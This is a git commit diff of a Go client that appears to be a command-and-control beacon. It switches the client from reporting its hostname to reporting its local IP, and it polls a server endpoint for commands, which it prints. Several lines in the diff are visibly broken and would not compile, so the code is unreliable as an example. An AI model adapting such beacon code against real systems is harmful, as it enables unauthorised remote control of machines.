b8636139fb1c82a5a86409033b5b8fa79e973953
Jim Maskelony <degenerat3@github.com>
2019-02-04 18:10:16 -0500

    change callback to be based on IP instead of HN

--- client/client.go
+++ client/client.go
@@ -7,6 +7,7 @@ import "os/exec"
 import "fmt"
 import "log"
 import "net/http"
+import "net"
 import "bytes"
 import "encoding/json"
 import "strings"
@@ -18,36 +19,23 @@ var loop_time = 10		//sleep time in secs
 
 // get hostname and return it as a string
 func get_hn() string {
-	cmd := exec.Command("hostname")
-	out, err := cmd.CombinedOutput()
-	if err != nil {
-		log.Fatalf("cmd.Run() failed with %s\n", err)
-		return "Err"
-	}
-	o1 := string(out)
-	o2 := strings.TrimSuffix(o1, "\n")
-	return o2
+	return os.Hostname()
 }
 
 
-func callback() {
-	hn := get_hn()
-	tm := time.Now()
-	clean_time := tm.Format("01-01-2000 01:00:00")
-	url := "http://" + serv + "/api/callback"	//turn ip into url
-	jsonData := map[string]string{"hostname": hn, "time": clean_time}
-	jsonVal, _ := json.Marshal(jsonData)
-	_, err := http.Post(url, "application/json", bytes.NewBuffer(jsonValue))
-	if err != nil{
-		fmt.Printf("Req Failed")
-		return
-	}
-	return
+func get_ip() string {
+	conn, _ := net.Dial("udp","8.8.8.8:80")
+	defer conn.Close()
+	ad := conn.LocalAddr().(*net.UDPAddr)
+	ip_str := ad.IP.String()
+	ip_str = strings.Replace(ad, ".","-")
+	return ip_str(ad, ".","-")
+}
 
 
 func get_commands() {
-	hn := get_hn()
-	url = "http://" + serv + "/api/commands/" + hn
+	ip := get_ip()
+	url = "http://" + serv + "/api/callback/" + ip
 	r, err := http.Get(url)
 	if err != nil{
 		panic(err)
@@ -57,11 +45,10 @@ func get_commands() {
 	if err != nil{
 		panic(err)
 	}
-	fmt.Printf("%s\n", txt)
+	fmt.Printf("commands: \n%s\n", txt)
 }
 
-func run(){
-	callback()
+func main(){
 	get_commands()
 }
 
